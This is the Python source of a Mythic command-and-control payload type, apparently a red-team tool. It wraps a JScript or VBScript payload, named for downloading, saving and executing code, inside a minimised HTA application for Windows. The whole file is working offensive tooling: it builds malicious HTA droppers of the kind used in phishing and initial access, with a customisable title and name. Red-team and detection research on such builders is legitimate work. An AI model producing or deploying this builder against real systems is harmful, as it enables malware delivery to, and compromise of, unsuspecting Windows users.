import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class hta_wraps_script(PayloadType):
    name = "hta_wraps_script"
    file_extension = "hta"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["jscript_download_save_execute"]
    note = """Creates a HTA payload from a JScript or VBScript script"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "clickable"
    agent_icon_path = agent_path / "agent_functions" / "click.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "hta_title",
            parameter_type=BuildParameterType.String,
            default_value="Hello",
            description="Defines the html title",
        ),
        BuildParameter(
            name = "hta_name",
            parameter_type=BuildParameterType.String,
            default_value="HTAPayload",
            description="Defines the hta name",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            script_payload = self.wrapped_payload.decode()

            response = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=self.wrapped_payload_uuid,
            ))

            hta_title = self.get_parameter('hta_title')
            hta_name = self.get_parameter('hta_name')

            if response.Success == False:
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "Unable to get target payload"
                return resp


            if "vbs" in response.Payloads[0].PayloadType:
                script_type = "VBScript"
            elif "jscript" in response.Payloads[0].PayloadType:
                script_type = "JScript"
            else:
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "Unsupported payload"
                return resp
            
            payload = """<html>
<head>
  <title>{hta_title}</title>
  <HTA:APPLICATION ID="{hta_name}"
    APPLICATIONNAME="{hta_name}"
    BORDER="thin"
    BORDERSTYLE="normal"
    CAPTION="yes"
    SHOWINTASKBAR="yes"
    SINGLEINSTANCE="yes"
    SYSMENU="yes"
    WINDOWSTATE="minimize">
</head>

<script language="{script_type}">
{script_payload}
</script>

<body>
</body>
</html>"""

            resp.payload = payload.format(script_type=script_type, script_payload=script_payload, hta_title=hta_title, hta_name=hta_name)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
